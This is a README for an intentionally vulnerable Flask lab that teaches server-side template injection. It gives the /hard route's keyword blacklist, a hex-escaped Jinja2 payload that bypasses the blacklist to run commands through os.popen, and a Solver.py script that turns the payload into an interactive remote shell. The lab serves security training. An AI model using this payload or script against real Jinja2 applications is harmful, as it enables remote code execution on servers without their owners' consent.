
## Ginger Juice Shop - Vulnerable SSTI Lab

Welcome to the Ginger Juice Shop, where you can explore and learn about Server-Side Template Injection (SSTI) vulnerabilities in a safe and controlled environment. This application provides two scenarios for practicing SSTI exploitation: a basic example and a more advanced challenge with input restrictions.


[Live Lab](https://ssti.pythonanywhere.com/)


### Homepage UI
<img width="1512" alt="image" src="https://github.com/user-attachments/assets/e4caf1ae-d9d5-4089-a3c4-c522a6b83932">

### Hard Section
<img width="1512" alt="image" src="https://github.com/user-attachments/assets/8135990a-1b2f-421e-972f-6dc6978b3e5f">

#### Keywords Blacklisted in /hard
```
['__', 'class', 'mro', 'subclasses', 'eval', 'exec', 'import', 'os', 'sys', '.', '_', 'config']
```

## Prerequisites 

Before setting up the application, make sure you have the following installed on your machine:

- **Python 3.7 or later**: [Download Python](https://www.python.org/downloads/)
- **Flask:** Usually comes by default in many newer debian distro if not just install it by using

```
pip3 install flask
```

## Installation 

1. **Clone the repository**:

```bash
git clone https://github.com/dr34mhacks/Ginger-juice-shop.git
```

2. **Navigate to the project directory**:

```bash
cd ginger-juice-shop
```

 3. **Running the application:**

```
flask run
```
<img width="1496" alt="image" src="https://github.com/user-attachments/assets/16f3bddd-aae2-4e1c-925d-2952ee31cf66">


This will start a local server, and you can access the application by navigating to `http://127.0.0.1:5000` in your web browser.
## Exploring the Application

The application provides two routes for exploring SSTI:

- **Basic SSTI (`/`)**: A simple form where you can input your name to test basic SSTI exploitation.
- **Advanced SSTI (`/hard`)**: A more challenging form with a blacklist filter to prevent common SSTI payloads.

## Learning Objectives

- Understand how SSTI vulnerabilities occur in web applications.
- Learn how to construct payloads to exploit SSTI in a safe environment.
- Explore techniques to bypass input filters and security mechanisms.
- Learn to abuse various dangerous functions of python to chain RCE

## Task
- gain rce
- get the flag.txt via RCE

## Solution of hard
#### Payload to bypass filters
```m
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fim'+'port\x5f\x5f')('o'+'s')|attr('popen')('id')|attr('read')()}}
```
#### Automated Solution

<img width="1635" alt="image" src="https://github.com/user-attachments/assets/9b33eb97-8714-4552-aef4-248aed1c6573">


`Solver.py`
```py
from rich.console import Console
from rich.prompt import Prompt
from rich.text import Text
from rich.panel import Panel
import requests

console = Console()

def send_payload(payload):
    url = "https://ssti.pythonanywhere.com/hard"
    data = {"name": payload}
    response = requests.post(url, data=data)
    return response

def print_response(response_text):
    # Extract h2 content
    start_tag = "<h2>"
    end_tag = "</h2>"
    start_index = response_text.find(start_tag)
    end_index = response_text.find(end_tag)

    if start_index != -1 and end_index != -1:
        h2_content = response_text[start_index + len(start_tag):end_index]
        console.print(Panel(f"[bold magenta]{h2_content}[/bold magenta]", title="Command Output", subtitle="Response", style="cyan"))
    else:
        console.print(Panel("[bold red]No output[/bold red]", title="Command Output", style="bold red"))

def run_shell():
    console.print(Panel("[bold green]Welcome Hacker![/bold green]", style="bold white on black"), justify="center")

    while True:
        try:
            # Styled prompt
            prompt_style = "[bold green]shell@raj$[/bold green] "
            command = Prompt.ask(prompt_style, default="", show_default=False)
            if command.lower() in ["exit", "quit"]:
                console.print(Text("Exiting shell. See you next time!", style="bold red"), justify="center")
                break
            
            # Send payload and get response
            payload = f"{{{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fim'+'port\\x5f\\x5f')('o'+'s')|attr('popen')('{command}')|attr('read')()}}}}"
            response = send_payload(payload)
            print_response(response.text)
        
        except KeyboardInterrupt:
            console.print(Text("\nInterrupted! Exiting...", style="bold red"), justify="center")
            break
        except Exception as e:
            console.print(Text(f"\nError: {e}", style="bold red"), justify="center")

if __name__ == "__main__":
    run_shell()
```

## Security Disclaimer

This application is intended for educational purposes only. Do not use these techniques on systems without explicit permission. Always practice ethical hacking and responsible disclosure.

## Contributing

Feel free to submit issues or pull requests for enhancements or bug fixes. Contributions are welcome!

## Blog 

- [https://dr34mhacks.github.io/posts/how-to-exploit-ssti/](https://dr34mhacks.github.io/posts/how-to-exploit-ssti/)

## License

This project is licensed under the MIT License

Happy Hunting! 🛡️🔍
